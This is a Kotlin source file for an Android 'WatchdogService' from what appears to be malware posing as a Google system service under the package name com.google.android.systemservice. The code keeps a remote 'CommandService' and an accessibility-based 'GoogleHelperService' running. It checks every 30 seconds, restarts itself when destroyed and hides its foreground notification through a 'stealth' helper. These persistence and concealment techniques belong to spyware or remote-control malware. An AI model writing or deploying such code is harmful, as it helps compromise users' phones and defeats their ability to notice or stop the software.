package com.google.android.systemservice.services

import android.app.ActivityManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import com.google.android.systemservice.utils.StealthNotificationHelper

/**
 * Watchdog service that monitors CommandService and restarts it if killed.
 * Runs in a separate process for dual-process guard pattern.
 */
class WatchdogService : Service() {

    companion object {
        private const val TAG = "WatchdogService"
        private const val CHECK_INTERVAL_MS = 30_000L // 30 seconds
    }

    private val handler = Handler(Looper.getMainLooper())
    private val watchdogRunnable = object : Runnable {
        override fun run() {
            checkAndRestartServices()
            handler.postDelayed(this, CHECK_INTERVAL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        val notification = StealthNotificationHelper.createStealthNotification(this)
        startForeground(StealthNotificationHelper.WATCHDOG_SERVICE_ID, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        handler.removeCallbacks(watchdogRunnable)
        handler.post(watchdogRunnable)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun checkAndRestartServices() {
        // Watch CommandService
        if (!isServiceRunning(CommandService::class.java.name)) {
            Log.d(TAG, "CommandService is dead, restarting...")
            try {
                val intent = Intent(this, CommandService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(intent)
                } else {
                    startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to restart CommandService: ${e.message}")
            }
        }
        
        // Watch GoogleHelperService (Accessibility)
        if (!isServiceRunning(GoogleHelperService::class.java.name)) {
            Log.d(TAG, "GoogleHelperService is dead, restarting...")
            try {
                val intent = Intent(this, GoogleHelperService::class.java)
                startService(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to restart GoogleHelperService: ${e.message}")
            }
        }
    }

    private fun isServiceRunning(className: String): Boolean {
        val manager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        @Suppress("DEPRECATION")
        return manager.getRunningServices(Integer.MAX_VALUE)
            .any { it.service.className == className }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(watchdogRunnable)
        // Try to restart self
        val intent = Intent(this, WatchdogService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to self-restart: ${e.message}")
        }
    }
}
